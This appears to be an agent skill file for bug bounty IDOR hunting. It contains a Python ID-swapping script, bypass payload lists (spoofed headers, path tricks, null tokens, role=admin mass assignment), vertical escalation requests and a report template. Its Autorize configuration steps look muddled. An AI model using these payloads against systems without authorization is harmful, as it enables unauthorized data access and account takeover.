---
name: idor-hunting
description: Hunt Insecure Direct Object Reference (IDOR) — test horizontal and vertical privilege escalation across user IDs, org IDs, tenant boundaries, and unguessable identifiers. Use when the user has an API endpoint with an identifier in the path/body that may be tested for unauthorized cross-user access.
metadata:
  type: skill
  phase: hunt
  vuln_class: idor
  cwe: 639
  paid_examples: hackerone
---

# IDOR Hunting

> Single most paid vuln class in BB history. Boring to test, lucrative to find.

## When to invoke

**Trigger phrases:**
- "test IDOR"
- "find IDOR in X"
- "is this endpoint vulnerable to IDOR"
- "cross-tenant"
- "object reference"

## Pre-requisites

You need **two accounts in different trust zones** to test most IDOR:
- Two separate user accounts (horizontal IDOR)
- Two accounts in different orgs/teams (cross-tenant IDOR)
- User + admin (vertical privilege escalation)
- User + guest (read-only role bypass)

Best setup: **Account A (attacker)** and **Account B (victim)** in separate browser profiles or with Burp's Cookie Jar feature.

## The 5 IDOR patterns

### Pattern 1: Sequential numeric IDs
```
GET /api/v3/user/12345/profile  ← logged in as user 12345
GET /api/v3/user/12346/profile  ← can you read?
```
**Fix:** rotate the trailing number in Burp Intruder, look for 200 + populated data.

### Pattern 2: UUID / opaque IDs
```
GET /api/v3/document/3f8c7b2a-1234-5678-9abc-def012345678
```
"UUIDs prevent IDOR" — **myth**. UUIDs leak via:
- URL sharing
- Email notifications (your account's UUID for someone else's doc)
- WebSocket messages
- Search results that include other users' docs
- Source maps
- Stripe/Twilio webhooks
- The `Referer` header

**Hunt:** collect UUIDs from your other accounts → swap.

### Pattern 3: Indirect references (encoded IDs)
```
GET /api/v3/order?id=eyJ1c2VyIjoiMTIzIn0=    ← base64
GET /api/v3/order?id=md5_of_user_id
```
**Decode first:**
```bash
echo "eyJ1c2VyIjoiMTIzIn0=" | base64 -d
# {"user":"123"}
```
Then modify and re-encode.

### Pattern 4: Multi-parameter IDOR
```
POST /api/v3/transfer
{
  "from_account": 12345,    ← your account
  "to_account": 12346,
  "amount": 50
}
```
**Hunt:** swap `from_account` to another user's ID → unauthorized money movement?

### Pattern 5: HTTP method confusion (METHOD IDOR)
```
GET /api/v3/user/12346      ← 403 forbidden
POST /api/v3/user/12346     ← but POST works
PUT /api/v3/user/12346      ← or PUT
PATCH /api/v3/user/12346    ← or PATCH
DELETE /api/v3/user/12346   ← or DELETE
```

## Step-by-Step Workflow

### 1. Map identified endpoints

From `[[js-analysis]]` and `[[content-discovery]]` outputs:

```bash
# Filter URLs containing identifiers
cat endpoints-live.txt | grep -E '/[a-f0-9-]{36}|/[0-9]+/|/uuid/|/[a-zA-Z0-9_-]{16,}/' > idor-candidates.txt
```

### 2. Create test accounts (a + b)

For each application:
- Sign up as `attacker@yopmail.com` (Account A)
- Sign up as `victim@yopmail.com` (Account B)
- Note: user IDs, org IDs, project IDs, document IDs of each

### 3. Capture victim's IDs

Log in as B, capture:
- User profile ID
- Org ID
- Any document/project/order IDs they created
- Their email and username

Log out.

### 4. Log in as A, attempt cross-access

Method 1: Burp Match & Replace (semi-auto)
```
Match:   /api/v3/user/AAAAAAA-USER-A-UUID
Replace: /api/v3/user/BBBBBBB-USER-B-UUID
```
Browse the app normally — every endpoint with A's ID gets swapped to B's.

Method 2: Burp Autorize extension (recommended)
- Configure with Account A's cookies (active session)
- Provide Account B's request templates ("unauthenticated" template) in Autorize
- Walk through the app → Autorize replays each request with no cookies / B's cookies
- Auto-marks endpoints as "Auth bypass possible" or "Auth correctly enforced"

Method 3: scripted with Python
```python
import requests

# Session A (attacker)
sA = requests.Session()
sA.cookies.set('session', 'A_SESSION_COOKIE', domain='target.com')

# Victim B's IDs
B_USER_ID = 'BBBBBBB-USER-B-UUID'

# Try IDOR
endpoints = [
    f'/api/v3/user/{B_USER_ID}',
    f'/api/v3/user/{B_USER_ID}/profile',
    f'/api/v3/user/{B_USER_ID}/email',
    f'/api/v3/user/{B_USER_ID}/orders',
    f'/api/v3/user/{B_USER_ID}/notifications',
    f'/api/v3/user/{B_USER_ID}/billing',
]
for ep in endpoints:
    r = sA.get(f'https://app.target.com{ep}')
    if r.status_code == 200 and B_USER_ID in r.text:
        print(f'[IDOR] {ep}\n{r.text[:300]}\n')
```

### 5. Try BOLA (Broken Object-Level Authorization) — OWASP API #1

Beyond simple IDOR, test:
- Read someone's object
- Modify someone's object (PATCH/PUT)
- Delete someone's object (DELETE)
- Add yourself to someone's resource
- Add someone to your resource (force them into a relationship)

### 6. Bypass tricks when straight swap fails

If `/api/v3/user/12346` returns 403, try:

```bash
# Path manipulation
/api/v3/user/12346/
/api/v3/user/12346/.
/api/v3/user/12346/..
/api/v3/user//12346
/api/v3/user/12346%00
/api/v3/user/12346..json
/api/v3/user/12346.json
/api/v3/user/12345/../12346

# HTTP method
GET → POST/PUT/PATCH/DELETE/OPTIONS

# Headers
X-Original-URL: /api/v3/user/12346
X-Rewrite-URL: /api/v3/user/12346
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: internal.target.com
X-Custom-IP-Authorization: 127.0.0.1
Referer: https://app.target.com/admin
X-Original-Method: GET

# Parameter
?user_id=12346     (in addition to path)
?_method=PUT
?role=admin

# Mass assignment with extra fields
{"id": 12345, "user_id": 12346, "role": "admin"}

# JSON parameter pollution
{"user_id": 12345, "user_id": 12346}  ← which wins?

# Wildcard / array
{"user_id": ["*"]}
{"user_id": [12345, 12346]}

# Authorization header tricks
Authorization: Bearer null
Authorization: Bearer undefined
Authorization:           ← empty
Cookie: session=         ← empty
```

### 7. Vertical IDOR (privilege escalation)

Find admin-only endpoints from `[[js-analysis]]`:
```bash
grep -hiE 'admin|manage|delete-user|set-role|invite|approve|reject' endpoints.txt
```

Test as low-priv user:
- `POST /api/v3/admin/users/12345/set-role` `{"role": "admin"}`
- `POST /api/v3/admin/billing/refund` `{"amount": 999999}`

## Bug Bounty payout examples

**Real H1 / BC reports show:**

| Severity | Example IDOR | Typical bounty |
|---|---|---|
| Low | Read other user's display name | $50-200 |
| Medium | Read other user's email + profile | $300-800 |
| High | Read other user's documents / messages | $1k-3k |
| High | Modify other user's settings (account hijack) | $2k-5k |
| Critical | Cross-tenant data access (whole org's data) | $5k-15k |
| Critical | Admin function reachable by user (delete users / refund money) | $10k-30k |

## Output template

```markdown
## IDOR: <one-line description>

**Endpoint:** `GET /api/v3/user/{user_id}/notifications`
**Test accounts:**
- Account A: user_id = `AAAA-A`
- Account B: user_id = `BBBB-B`

**PoC:**
1. Log in as Account A
2. Send request: `GET /api/v3/user/BBBB-B/notifications`
3. Response includes Account B's notifications, emails, and unread counts

**Cookies used (Account A's session):**
```
session=eyJhbGc...
```

**Response excerpt (Account B's private data exposed):**
```json
{
  "user_id": "BBBB-B",
  "notifications": [
    {"id": 1, "text": "Your invoice 4567 is paid", "email": "victim@example.com"}
  ]
}
```

**Impact:**
- Any user can read any other user's notifications, including:
  - Email addresses (PII)
  - Invoice / order IDs (financial data hint)
  - Internal mentions / messages
- Affects all 2M+ accounts.

**Suggested fix:**
- Validate `request.user.id == path.user_id` on this endpoint.
- Apply same check on `/profile`, `/email`, `/orders` (likely affected).
```

## Cross-references

- `[[auth-bypass]]` — when straight IDOR fails, try auth bypass tricks
- `[[ato-chains]]` — IDOR that leads to account takeover
- `[[business-logic]]` — IDOR + state mutation = logic bug
- `[[graphql]]` — IDOR is rampant in GraphQL (field-level)
- `[[hackerone-reporting]]` — IDOR report template

## Common pitfalls

1. **Testing with one account.** No comparison → no proof.
2. **Reporting unauth read of public data.** Some `/user/{id}/profile` returns are intentionally public. Verify.
3. **Confusing 404 for "fixed".** 404 might mean "different user → resource not found", which is actually different from "blocked".
4. **Not testing PUT/DELETE/PATCH.** Read IDOR is common; write IDOR is rare + critical.
5. **Reporting without impact framing.** "I read another user's display name" → likely informative. Add chain (read email → ATO).

## Always-rejected variant

**Don't report:**
- Reading data that's marked public (test before reporting)
- Reading your own data via someone else's identifier (no actual cross-access)
- "Self IDOR" (URL contains your ID and works — that's correct)
- IDOR where the "other ID" must be guessed and is high-entropy AND not leakable

## Autorize setup (Burp extension)

1. Install Autorize from BApp Store
2. Open Autorize tab
3. Configure:
   - **Cookies for "Low Privilege"**: leave empty (= unauthenticated)
   - **Cookies for "Unauthenticated"**: paste Account A's session cookies
4. Click "Autorize is off" → toggle on
5. Browse target as Account B
6. Autorize replays each request as A and unauth, marks results

Color codes:
- 🟢 Green = correctly enforced (no bug)
- 🔴 Red = bypassed (potential IDOR)
- 🟡 Yellow = needs manual verification

## Chained IDOR (mention in report for higher severity)

```
IDOR (read email) → password reset → ATO          [chain doc in [[ato-chains]]]
IDOR (read OTP) → 2FA bypass → ATO                [chain doc in [[auth-bypass]]]
IDOR (read API key) → full account access         [report as ATO directly]
IDOR (write user.role) → privilege escalation     [vertical IDOR + mass assignment]
```
